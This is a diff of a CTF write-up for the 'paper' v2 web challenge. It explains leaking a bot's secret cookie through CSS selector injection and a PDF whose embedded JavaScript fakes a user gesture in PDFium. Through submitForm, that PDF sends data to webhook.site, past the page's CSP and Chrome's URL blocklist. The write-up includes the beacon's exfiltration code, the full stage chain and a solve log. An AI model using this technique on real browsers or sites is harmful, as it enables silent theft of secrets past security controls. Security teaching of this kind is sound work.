@@ -584,15 +584,11 @@ The intern's linear algebra argument was solid&mdash;5 equations in 32 unknowns 
 
 > A piece of paper is a blank canvas, what do you want on yours?
 
-Sequel to the `paper` challenge from corCTF 2025 by ehhthing, where v2 patches all known solutions by blocking external network access from the bot's browser entirely. The solve is CSS injection with PDF JavaScript beacons.
+This is paper again from corCTF 2025 except they killed the easy version. Same upload primitive&mdash;any file, any content type, served on the challenge origin&mdash;same `/secret` endpoint that sticks the bot's secret cookie into a `<body secret="...">` attribute and injects your `payload` parameter raw into the HTML, same 60-second window to leak the secret and hit `/flag` with it before `GETDEL` nukes the key.
 
-### The server
+What changed: the bot's Chrome now has an enterprise policy that blocks everything except the challenge origin. `URLBlocklist: ['*']`, `URLAllowlist: ['https://web']`. And the CSP is `default-src 'self' 'unsafe-inline'; script-src 'none'` on every response, including uploaded pages. No JS anywhere. CSS and same-origin iframes/objects still work.
 
-Bun + Puppeteer + Redis -- upload files, bot visits your page, leak the secret, get the flag. The [full source is in the appendix](#appendix-index-ts) but here's what matters.
-
-`POST /upload` takes any file up to 64KB and stores the content type from the upload verbatim with no validation. `GET /paper/:id` serves it back with that content type, so uploading as `text/html` gives you arbitrary HTML on the challenge origin.
-
-`GET /secret` is where the fun is:
+Here's `/secret`:
 
 ```typescript title=index.ts startLineNumber=128
 '/secret': async (req: BunRequest): Promise<Response> => {
@@ -606,55 +602,21 @@ Bun + Puppeteer + Redis -- upload files, bot visits your page, leak the secret, 
 },
 ```
 
-The bot's `secret` cookie gets placed into a `secret` attribute on `<body>`, and the `payload` query parameter is injected **raw** into the HTML with no escaping whatsoever -- full HTML injection via the query string.
+The secret goes into a `secret` attribute on `<body>`, and `payload` is injected raw&mdash;so CSS attribute selectors can match against the secret value, and we can inject arbitrary HTML minus scripts.
 
-`GET /flag` takes a `secret` parameter and compares it against the stored value using `redis.getdel('secret')`, which atomically reads and deletes the key, giving you exactly one shot.
+The v1 solve used JS on an attacker page to `window.open()` the `/secret` endpoint, CSS to conditionally hide objects, `window.length` to count frames and detect which character matched, and `sendBeacon()` to exfiltrate. That's dead twice over: no JS to count frames, and nowhere off-site to send anything.
 
-`GET /visit/:id` triggers the bot: it generates a 32-hex-char secret (`randomBytes(16).toString('hex')`), sets it as a `SameSite=Strict` cookie, stores it in Redis with a **60-second TTL**, navigates to our page, and sleeps for 61 seconds. That gives us exactly 60 seconds to exfiltrate and submit.
+### CSS detection, PDF exfiltration
 
-### The constraints
+The CSS part is straightforward. `body[secret^="a1"]` matches if the first two characters are `a1`, and you can gate which `<object>` tags are visible with `display: none` / `display: block`&mdash;Chrome won't fetch the `data` URL of a hidden object. So CSS can detect characters of the secret. The problem is getting that information back out when there's no JS and no external network.
 
-Every response gets this CSP:
+Chrome's PDF viewer (PDFium) has its own JavaScript engine, completely separate from the page. When you load a PDF via `<object>`, any JS embedded in it runs in a context that isn't subject to the page's CSP at all, and PDF JS has `this.submitForm()` which can make outbound HTTP requests.
 
-```
-default-src 'self' 'unsafe-inline'; script-src 'none'
-```
+Except `submitForm` is supposed to require a user gesture. PDFs should not be making unsolicited network requests. So the real question is why this requirement is bypassable.
 
-`script-src 'none'` means no JS anywhere -- not in uploaded pages, not in injected HTML, nowhere -- but `default-src 'self' 'unsafe-inline'` leaves inline CSS wide open, and same-origin iframes and `<object>` tags are fair game too.
+### The "user gesture" check in PDFium
 
-And then there's the Chrome enterprise policy:
-
-```json
-{ "URLBlocklist": ["*"], "URLAllowlist": ["https://web"] }
-```
-
-The bot can't reach any external URL -- not through navigation, not through resource loading, not through anything -- and this is what makes v2 so much harder than v1.
-
-### v1 is dead
-
-The corCTF 2025 v1 solution by Jorian Woltjer used `window.open()` from an attacker-hosted page with CSS to conditionally hide `<object>` elements, counted `window.length` from JS to detect which character matched, and exfiltrated via `navigator.sendBeacon()`. Paper-2 kills both halves of that approach: there's no JS context to count frames from, and no external network to exfiltrate to.
-
-### So how do you get data out?
-
-We need something that can:
-
-1. Detect which CSS selectors matched (which characters of the secret are correct)
-2. Transmit that information to us externally
-3. Do both without JavaScript and without external network access from the page
-
-CSS attribute selectors handle #1 -- `body[secret^="a1"]` matches if the secret starts with `"a1"`, and we can toggle `display: none` / `display: block` on `<object>` tags to conditionally load resources based on which selector matches (the browser won't fetch the `data` URL of a hidden `<object>`).
-
-But #2 and #3 seem impossible, since the page can't run JS and the browser can't reach external URLs. How do you phone home?
-
-### PDFs should not be able to do this
-
-Chrome's built-in PDF viewer (PDFium) has its own JavaScript engine, and when you load a PDF via `<object data="/paper/1" type=application/pdf>`, any JS embedded in it runs in a completely separate context from the HTML page -- the page's CSP doesn't apply, and `this.submitForm()` in PDF JS can make outbound HTTP requests.
-
-But `submitForm` has a user interaction requirement; you're not supposed to be able to call it programmatically, and PDFs definitely should not be making unsolicited outbound network requests. Let's look at why we can anyway.
-
-### Faking a user gesture in PDFium
-
-PDFium's `submitForm` implementation in [`fxjs/cjs_document.cpp`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_document.cpp) checks for a user gesture before allowing the call:
+`submitForm` in [`fxjs/cjs_document.cpp`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_document.cpp) checks this before doing anything:
 
 ```cpp
 CJS_EventContext* pHandler = pRuntime->GetCurrentEventContext();
@@ -663,7 +625,7 @@ if (!pHandler->IsUserGesture()) {
 }
 ```
 
-And [`IsUserGesture()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_event_context.cpp) is:
+And [`IsUserGesture()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_event_context.cpp):
 
 ```cpp
 bool CJS_EventContext::IsUserGesture() const {
@@ -678,59 +640,57 @@ bool CJS_EventContext::IsUserGesture() const {
 }
 ```
 
-That's it -- no transient activation token, no propagation tracking from actual input events, no verification that a human did anything. "User gesture" in PDFium just means "the current JS is executing inside an event context whose `kind_` is one of three enum values," and if `kind_ == kFieldKeystroke`, `submitForm` goes through.
+There's no real activation tracking here. PDFium just checks whether the current JS is executing inside one of three event context enum values, and if `kind_ == kFieldKeystroke`, `submitForm` goes through. No transient activation token, no propagation from actual input events, no verification that a human did anything.
 
-So the question is whether we can get code to run in a `kFieldKeystroke` context without any actual user interaction, and it turns out we can: programmatically setting a form field's value triggers the field's keystroke action (`/AA /K`), and that action runs in a `kFieldKeystroke` context. Here's the full call chain through PDFium:
+So: can you get code into a `kFieldKeystroke` context without any user interaction? Yes&mdash;programmatically setting a form field's value triggers the field's keystroke action (`/AA /K`), and that action runs in `kFieldKeystroke`. The path through PDFium source:
 
-1. **Document opens.** The `/OpenAction` JS runs in a `kDocOpen` context. Our script: `this.getField('q').value = 'x'`
+1. **Document opens.** `/OpenAction` JS runs in a `kDocOpen` context: `this.getField('q').value = 'x'`
 
-2. **[`CJS_Field::set_value()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_field.cpp)** calls `SetFieldValue()`, which calls `pFormField->SetValue(strArray[0], NotificationOption::kNotify)`. The `kNotify` flag is the key -- it triggers the form's notification system.
+2. [`CJS_Field::set_value()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fxjs/cjs_field.cpp) calls `SetFieldValue()`, which calls `pFormField->SetValue(strArray[0], NotificationOption::kNotify)`. The `kNotify` flag is what makes the whole thing work&mdash;it activates the form's notification system.
 
-3. **[`CPDF_FormField::SetValue()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/core/fpdfdoc/cpdf_formfield.cpp)** with `kNotify` calls `form_->NotifyBeforeValueChange()`, which calls `BeforeValueChange()` on the form notification handler.
+3. [`CPDF_FormField::SetValue()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/core/fpdfdoc/cpdf_formfield.cpp) with `kNotify` calls `form_->NotifyBeforeValueChange()`, which calls `BeforeValueChange()` on the form notification handler.
 
-4. **[`CPDFSDK_InteractiveForm::BeforeValueChange()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_interactiveform.cpp)** calls `OnKeyStrokeCommit()`, which checks if the field has a `/AA /K` (keystroke) additional action. It does, so it dispatches:
+4. [`CPDFSDK_InteractiveForm::BeforeValueChange()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_interactiveform.cpp) calls `OnKeyStrokeCommit()`, sees the field has a `/AA /K` (keystroke) additional action, and dispatches it:
 
     ```cpp
     form_fill_env_->DoActionFieldJavaScript(
         action, CPDF_AAction::kKeyStroke, pFormField, &fa);
     ```
 
-5. **[`RunFieldJavaScript()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_formfillenvironment.cpp)** calls `context->OnField_Keystroke(...)`, which sets `kind_ = Kind::kFieldKeystroke`.
+5. [`RunFieldJavaScript()`](https://pdfium.googlesource.com/pdfium/+/refs/heads/main/fpdfsdk/cpdfsdk_formfillenvironment.cpp) calls `context->OnField_Keystroke()`, which sets `kind_ = Kind::kFieldKeystroke`.
 
-6. **Our keystroke action JS now runs** in a `kFieldKeystroke` context, so `IsUserGesture()` returns `true` and `submitForm` goes through.
+6. Now the keystroke action JS is running in a `kFieldKeystroke` context. `IsUserGesture()` returns `true`. `submitForm` goes through.
 
-The notification system (`kNotify`) was originally designed for maintaining form consistency -- triggering validation, formatting, and calculations when a field changes -- but it inadvertently creates a privilege escalation path: `kDocOpen` (no gesture) -> programmatic `set_value` -> `kNotify` -> `BeforeValueChange` -> `OnKeyStrokeCommit` -> `/AA /K` action in `kFieldKeystroke` context (gesture!) -> `submitForm` allowed.
+The form notification system&mdash;designed for maintaining consistency through validation, formatting, and calculation triggers when a field changes&mdash;accidentally promotes `kDocOpen` actions to `kFieldKeystroke` privilege. The escalation path is `kDocOpen` (no gesture) &rarr; programmatic `set_value` &rarr; `kNotify` &rarr; `BeforeValueChange` &rarr; `OnKeyStrokeCommit` &rarr; `/AA /K` dispatched as `kKeyStroke` type &rarr; `kind_` set to `kFieldKeystroke` &rarr; `submitForm` allowed.
 
-### Why CSP and URLBlocklist don't apply either
+### Why CSP and the URL blocklist don't help
 
-There are two more layers that should have stopped this, and neither does.
+There are two more layers that should stop this. Neither does.
 
-**CSP bypass:** The PDF plugin ([`PdfViewWebPlugin`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/pdf_view_web_plugin.cc)) runs as a `blink::WebPlugin` inside a MimeHandlerView guest frame -- a cross-process OOPIF with its own security context, entirely separate from the embedding page. When `submitForm` fires, `PdfViewWebPlugin::SubmitForm()` constructs its own `UrlRequest` and sends it through [`UrlLoader`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/loader/url_loader.cc), configured with:
+The PDF plugin ([`PdfViewWebPlugin`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/pdf_view_web_plugin.cc)) runs in a MimeHandlerView guest frame&mdash;a cross-process OOPIF with its own security context, entirely separate from the embedding page. When `submitForm` fires, `PdfViewWebPlugin::SubmitForm()` sends the request through [`UrlLoader`](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/pdf/loader/url_loader.cc), configured with:
 
 ```cpp
 options.grant_universal_access = true;
 ```
 
-The request is tagged as `RequestContextType::PLUGIN` / `RequestDestination::kEmbed`, and when `grant_universal_access` is true the URL loader creates a universally-privileged opaque `SecurityOrigin` via `GrantUniversalAccess()`. The Chromium source has a comment: *"When true, omit origin related checks. USE WITH CARE."*
+The request is tagged `RequestContextType::PLUGIN` / `RequestDestination::kEmbed`, and the `grant_universal_access` flag creates a universally-privileged opaque origin via `GrantUniversalAccess()`. The Chromium source comment reads: *"When true, omit origin related checks. USE WITH CARE."*
 
-Because the request originates from the plugin's privileged loader rather than the page's document context, the embedding page's CSP headers are never consulted -- `script-src`, `connect-src`, `form-action`, none of them see this request.
-
-**URLBlocklist bypass:** Chrome's enterprise URL blocklist targets navigations and standard frame/resource loads, but the PDF plugin's `submitForm` POST goes through `WebAssociatedURLLoader` with `grant_universal_access` and `RequestContextType::PLUGIN` -- a completely different code path that the policy enforcement doesn't cover.
+Because the request goes out through the PDF plugin's own loader rather than the page's document context, the page's CSP is never consulted&mdash;`script-src`, `connect-src`, `form-action`, none of it applies. And the enterprise URL blocklist targets navigations and standard frame/resource loads; plugin-initiated POSTs through `WebAssociatedURLLoader` with universal access are a different code path that the policy enforcement doesn't cover.
 
 <Callout variant="important">
-Three separate security boundaries, all bypassed. PDFium thinks this is a user-initiated action (because `kFieldKeystroke`). Chrome's PDF plugin sends it through a privileged URL loader that bypasses CSP. And the enterprise URL blocklist doesn't intercept plugin-level POSTs. The result: a PDF loaded via `<object>` can silently POST to any URL on the internet.
+The result is that a PDF loaded via `<object>` can silently POST to any URL on the internet, past three separate security mechanisms that all looked like they should have stopped it.
 </Callout>
 
 ### The beacon PDF
 
-With all that in mind, the beacon PDF is straightforward -- a minimal PDF-1.7 with an AcroForm containing a text field widget `"q"` that has a `/AA /K` keystroke action, plus an OpenAction that kicks off the chain.
+The exploit constructs a minimal PDF-1.7 from scratch with an AcroForm containing one text field widget `"q"` with a `/AA /K` keystroke action, plus an OpenAction that starts the chain.
 
-OpenAction JS:
+The OpenAction sets the field value:
 ```javascript
 this.getField('q').value='x';
 ```
 
-Keystroke action JS:
+The keystroke handler reads `this.URL`&mdash;the URL the PDF was loaded from, including query parameters&mdash;and forwards it to webhook.site:
 ```javascript
 var u=this.URL;
 var i=u.indexOf('?');
@@ -738,49 +698,38 @@ var qs=i>=0?u.substring(i+1):'';
 this.submitForm({cURL:'https://webhook.site/<token>?'+qs,bFDF:false,bEmpty:true,aFields:['q']});
 ```
 
-`this.URL` is the URL the PDF was loaded from, so if we load the beacon via `<object data="/paper/1?s=0&d=p&c=a1">`, `this.URL` contains those query params and `submitForm` forwards them to webhook.site. From our exploit script, we just poll webhook.site's API to see what came back.
+So if the object loads `/paper/1?s=0&d=p&c=a1`, the PDF extracts that query string and ships it off in the form submit. The exploit script just polls webhook.site's API to see what came back.
 
-### Putting it together
+### The full chain
 
-The attack chain:
+Putting it all together:
 
 ```
-Main page (our HTML, uploaded to /paper/{main_id})
-  +-- <iframe> --> helper page (our HTML, /paper/{helper_id})
+Main page (/paper/{main_id})
+  +-- <iframe> --> helper page (/paper/{helper_id})
   |     +-- <iframe> --> /secret?payload=<CSS + objects>
-  |           |
   |           +-- <body secret="a1b2c3...">
   |           +-- <style>
   |           |     object { display: none }
   |           |     body[secret^="a1"] #p1 { display: block }
-  |           |   </style>
   |           +-- <object id=p1 data="/paper/{beacon}?s=0&d=p&c=a1">
-  |                 +-- PDF opens, OpenAction fires
-  |                       +-- submitForm("https://webhook.site/...?s=0&d=p&c=a1")
-  ...
+  |                 +-- PDF JS fires, submitForm to webhook.site
   +-- <meta http-equiv="refresh" content="6.5;url=/paper/{next_stage}">
 ```
 
-When the bot loads this, `body[secret^="a1"]` matches (assuming the secret starts with `a1`), so `#p1` gets `display: block` and Chrome loads that PDF while all the other objects stay hidden and are never fetched. The PDF phones home, and we learn that stage 0's prefix is `"a1"`.
+Whichever `<object>` CSS leaves visible is the one Chrome actually loads, and that PDF immediately fires `submitForm` with the candidate value in the query string. Everything else stays hidden and never gets fetched.
 
-### Multi-stage exfiltration
+### Multi-stage recovery
 
-The secret is 32 hex characters, and since CSS `^=` and `$=` only match from the start and end of the attribute value (there's no "match at position N" selector), we have to grow the known prefix rightward and suffix leftward, 2 characters at a time from each end:
+The secret is 32 hex characters, and CSS `^=` / `$=` only match from the start and end of the attribute value&mdash;there's no "match at position N" selector. So the secret has to be recovered from both ends inward, two characters at a time. Eight stages, each leaking one hex pair from the prefix and one from the suffix, meeting in the middle.
 
-```
-Stage 0: prefix=""   suffix=""        --> learns first 2 + last 2
-Stage 1: prefix="a1" suffix="90"      --> learns chars 3-4 + 29-30
-...
-Stage 7: all 32 chars known
-```
+Each stage uses 16 helper pages (one per high hex nibble `0`&ndash;`f`), each containing 32 `<object>` tags: 16 prefix candidates and 16 suffix candidates. Across all 16 helpers, exactly one prefix object and one suffix object have their CSS selector match, causing those two beacon PDFs to fire. The exploit detects both callbacks via webhook.site polling, appends the new characters to the known prefix/suffix, and uploads the next stage with updated selectors.
 
-Each stage has 16 helper pages (one per high hex nibble `0`-`f`), each testing 16 low nibbles for both prefix and suffix directions -- that's 32 `<object>` tags per helper, and across all 16, exactly one prefix and one suffix beacon fires.
+Stages are chained by `<meta http-equiv="refresh">` since there's no JS to orchestrate navigation. After the delay fires, the bot auto-navigates to the next stage's main page.
 
-Stages are linked by `<meta http-equiv="refresh">` with a 6.5-second delay; after the refresh fires, the bot navigates to the next stage's main page, and we use that window to collect the webhook callbacks and upload the next stage (which needs the newly-known characters in its CSS selectors).
+Upload IDs are sequential via `redis.incr` and each stage consumes exactly 17 IDs (16 helpers + 1 main), so every future ID can be predicted from the beacon's initial ID. The meta refresh for stage N has to point at stage N+1's main page before it exists&mdash;this works because IDs are deterministic. Every ID is verified after upload; if another user consumed one in between, the chain would silently desync, so the exploit fails fast on any mismatch.
 
-Since upload IDs are sequential (`redis.incr`) and each stage consumes exactly 17 IDs (16 helpers + 1 main), we can predict all future IDs from the beacon's ID and verify after each upload. If another user takes an ID the chain breaks, so use a fresh instance.
-
-Total timing comes out to ~57 seconds across 8 stages, fitting under the 60-second Redis TTL with about 3 seconds to spare.
+The whole thing runs in about 57 seconds across 8 stages, fitting under the 60-second Redis TTL with roughly 3 seconds of slack. The first stage uses a 5-second meta refresh delay (extra time for the initial webhook.site round trip), subsequent stages use 6.5 seconds. Any shorter and the uploads would race the refresh.
 
 ### Running it
 
@@ -793,17 +742,11 @@ $ python3 solve.py --base-url https://lonely-island.picoctf.net:50239 --insecure
 [+] stage 00: prefix=88 suffix=9b (5.74s)
 [+] uploaded stage 1 page: /paper/35
 [+] stage 01: prefix=8817 suffix=419b (6.32s)
-[+] uploaded stage 2 page: /paper/52
 [+] stage 02: prefix=88175f suffix=90419b (7.39s)
-[+] uploaded stage 3 page: /paper/69
 [+] stage 03: prefix=88175f01 suffix=6f90419b (7.15s)
-[+] uploaded stage 4 page: /paper/86
 [+] stage 04: prefix=88175f01f8 suffix=ca6f90419b (7.76s)
-[+] uploaded stage 5 page: /paper/103
 [+] stage 05: prefix=88175f01f844 suffix=8bca6f90419b (8.06s)
-[+] uploaded stage 6 page: /paper/120
 [+] stage 06: prefix=88175f01f844c6 suffix=d68bca6f90419b (7.17s)
-[+] uploaded stage 7 page: /paper/137
 [+] stage 07: prefix=88175f01f844c679 suffix=56d68bca6f90419b (6.88s)
 [+] recovered secret: 88175f01f844c67956d68bca6f90419b
 [+] flag response (200): picoCTF{i_l1ke_frames_on_my_canvas_953d5fff}
